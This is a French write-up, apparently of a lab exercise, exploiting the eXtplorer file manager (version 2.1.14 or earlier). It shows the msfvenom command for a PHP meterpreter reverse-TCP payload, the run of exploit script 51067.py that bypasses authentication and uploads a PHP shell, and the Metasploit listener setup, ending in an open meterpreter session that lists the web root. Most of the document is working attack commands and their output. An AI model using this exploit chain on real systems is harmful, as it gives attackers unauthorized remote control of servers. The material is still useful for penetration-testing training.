# Démarche
- Ouverture du navigateur et accès au site grâce à l'url suivant : http://zero2hero.emes.bj:8091/
- Génération d'un payload avec la commande:
	msfvenom -p php/meterpreter/reverse_tcp LHOST=http://zero2hero.emes.bj LPORT=8091 -f base64
- Copie et collage du résutat dans la fonction _editPayload()_ 
	base64.b64decode("Résultat_en_base64") se trouvant dans le script télécharger au préalable sur exploitbd
- Exécution de l'exploit.

# Résultats
## Exploit
	└─$ python 51067.py -t http://zero2hero.emes.bj
	[I] eXtplorer endpoint is vulnerable!
	[I] Auth bypassed!
	[I] CSRF Token obtained: ef85c699963bbb81a04bbf71a7f3f4f9
	[I] Payload edited to fit local parameters
	[I] File ZUCJ0O.php uploaded in root dir
	[I] Now set a (metasploit) listener and go to: http://zero2hero.emes.bj//ZUCJ0O.php

	![Navigateur](/WebApps/eXtplorer<=2.1.14/1.png)


## Mise en place de l'écoute avec Metasploit et test

	└─$ msfconsole                                                              
		                                          
	  +-------------------------------------------------------+
	  |  METASPLOIT by Rapid7                                 |
	  +---------------------------+---------------------------+
	  |      __________________   |                           |
	  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
	  |             )=\           | |  EXPLOIT   \            |
	  |            // \\          | |_____________\_______    |
	  |           //   \\         | |==[msf >]============\   |
	  |          //     \\        | |______________________\  |
	  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
	  |        //         \\      |  *********************    |
	  +---------------------------+---------------------------+
	  |      o O o                |        \'\/\/\/'/         |
	  |              o O          |         )======(          |
	  |                 o         |       .'  LOOT  '.        |
	  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
	  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
	  | |________________|__|)__| |    |     __||_)     |     |
	  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
	  |  = = = = = = = = = = = =  |     '--------------'      |
	  +---------------------------+---------------------------+


	       =[ metasploit v6.3.4-dev                           ]
	+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
	+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
	+ -- --=[ 9 evasion                                       ]

	Metasploit tip: Writing a custom module? After editing your 
	module, why not try the reload command
	Metasploit Documentation: https://docs.metasploit.com/

	msf6 > use multi/handler
	[*] Using configured payload generic/shell_reverse_tcp
	msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp
	PAYLOAD => php/meterpreter/reverse_tcp
	msf6 exploit(multi/handler) > set http://zero2hero.emes.bj
	LHOST => http://zero2hero.emes.bj
	msf6 exploit(multi/handler) > set LPORT 8091
	LPORT => 8091
	msf6 exploit(multi/handler) > exploit

	[*] Started reverse TCP handler on http://zero2hero.emes.bj:8091
	[*] Sending stage (39927 bytes) to http://zero2hero.emes.bj
	[*] Meterpreter session 4 opened (http://zero2hero.emes.bj:8091 -> http://zero2hero.emes.bj:40476) at 2023-05-10 16:39:47 +0100

	meterpreter > whoami
	[-] Unknown command: whoami
	meterpreter > pwd
	/var/www/html/extplorer
	meterpreter > id
	[-] Unknown command: id
	meterpreter > ls
	Listing: /var/www/html/extplorer
	================================

	Mode            Size   Type  Last modified             Name
	----            ----   ----  -------------             ----
	100644/rw-r--r  34854  fil   2023-05-10 16:24:29 +010  70QXDN.php
	--                           0
	100644/rw-r--r  15279  fil   2021-01-21 14:15:50 +010  CHANGELOG.txt
	--                           0
	100644/rw-r--r  34854  fil   2023-05-10 16:20:06 +010  K9ICHU.php
	--                           0
	100644/rw-r--r  19242  fil   2012-07-02 12:05:36 +010  LICENSE_GPL.txt
	--                           0
	100644/rw-r--r  26221  fil   2012-07-02 12:05:36 +010  LICENSE_MPL.txt
	--                           0
	100644/rw-r--r  6744   fil   2016-04-13 11:45:14 +010  README.txt
	--                           0
	100644/rw-r--r  1116   fil   2023-05-10 16:39:30 +010  ZUCJ0O.php
	--                           0
	100644/rw-r--r  7588   fil   2021-01-21 14:17:36 +010  admin.extplorer.php
	--                           0
	100644/rw-r--r  5409   fil   2021-02-17 12:05:36 +010  application.php
	--                           0
	040755/rwxr-xr  4096   dir   2023-05-10 16:18:22 +010  config
	-x                           0
	100644/rw-r--r  737    fil   2012-07-02 12:05:36 +010  configuration.ext.php
	--                           0
	100644/rw-r--r  11561  fil   2012-07-02 12:05:36 +010  copyright
	--                           0
	100644/rw-r--r  1150   fil   2012-07-02 12:05:30 +010  eXtplorer.ico
	--                           0
	100644/rw-r--r  3647   fil   2012-07-02 12:05:36 +010  extplorer.init.php
	--                           0
	100644/rw-r--r  23108  fil   2021-01-21 14:14:54 +010  extplorer.j15.xml
	--                           0
	100644/rw-r--r  57     fil   2012-11-21 21:35:00 +010  extplorer.j30.php
	--                           0
	100644/rw-r--r  23162  fil   2021-01-21 14:14:26 +010  extplorer.j30.xml
	--                           0
	100644/rw-r--r  17446  fil   2012-07-02 12:05:36 +010  extplorer.list.php
	--                           0
	100644/rw-r--r  3220   fil   2016-02-23 12:06:32 +010  extplorer.php
	--                           0
	100644/rw-r--r  22887  fil   2021-01-21 14:15:06 +010  extplorer.xml
	--                           0
	100644/rw-r--r  7941   fil   2020-03-24 23:25:06 +010  fetchscript.php
	--                           0
	040755/rwxr-xr  4096   dir   2020-03-25 15:28:06 +010  ftp_tmp
	-x                           0
	040755/rwxr-xr  4096   dir   2020-03-25 15:28:08 +010  images
	-x                           0
	040755/rwxr-xr  4096   dir   2020-03-25 15:28:08 +010  include
	-x                           0
	100644/rw-r--r  3023   fil   2014-02-13 22:08:08 +010  index.php
	--                           0
	100644/rw-r--r  3307   fil   2015-09-15 22:20:08 +010  install.extplorer.php
	--                           0
	040755/rwxr-xr  4096   dir   2020-03-25 15:28:08 +010  languages
	-x                           0
	040755/rwxr-xr  4096   dir   2020-03-25 15:28:12 +010  libraries
	-x                           0
	100644/rw-r--r  1704   fil   2012-07-02 12:05:36 +010  script.php
	--                           0
	040755/rwxr-xr  4096   dir   2023-05-10 16:18:01 +010  scripts
	-x                           0
	040755/rwxr-xr  4096   dir   2020-03-25 15:28:16 +010  sql
	-x                           0
	040755/rwxr-xr  4096   dir   2020-03-25 15:28:16 +010  style
	-x                           0
	100644/rw-r--r  1216   fil   2012-07-02 12:05:36 +010  uploadhandler.php
	--                           0
	100644/rw-r--r  2794   fil   2012-07-02 12:05:30 +010  webdav.php
	--                           0
	100644/rw-r--r  3202   fil   2012-07-02 12:05:36 +010  webdav_authenticate.php
	--                           0
	100644/rw-r--r  1228   fil   2012-07-02 12:05:36 +010  webdav_table.sql.php
	--                           0

	meterpreter > 


